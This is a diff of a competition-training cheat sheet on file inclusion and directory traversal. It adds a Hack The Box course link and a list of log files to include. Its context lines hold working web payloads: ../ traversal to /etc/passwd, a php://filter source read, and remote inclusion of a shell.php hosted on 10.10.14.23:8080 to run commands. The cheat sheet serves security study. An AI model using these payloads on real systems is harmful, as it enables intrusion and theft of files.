@@ -1,6 +1,8 @@
 <[Back to Main Page](https://github.com/ChristopherFitzsimons/WorldSkills2022Cybersecurity)
 
 # FILE INCLUSION / DIRECTORY TRAVERSAL
+Usefull link:  
+https://academy.hackthebox.com/course/preview/file-inclusion--directory-traversal/local-file-inclusion  
 
 ## Quick Examples
 "index.php?language=../../../../../../../../../etc/passwd"  
@@ -29,6 +31,8 @@ python3 -m http.server 8080
 "index.php?language=http://localhost:8080/shell.php"  
 "index.php?page=php://filter/read=convert.base64-encode/resource=index"  
 "index.php?language=http://10.10.14.23:8080/shell.php&cmd=cat /exercise/flag.txt"  
+
+The output of the command id can be seen in the image above. Some other files that can be included based on the scenario are /var/log/nginx/access.log, /var/log/apache2/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log.  
 
 ## Notes
 ### Local File Inclusion
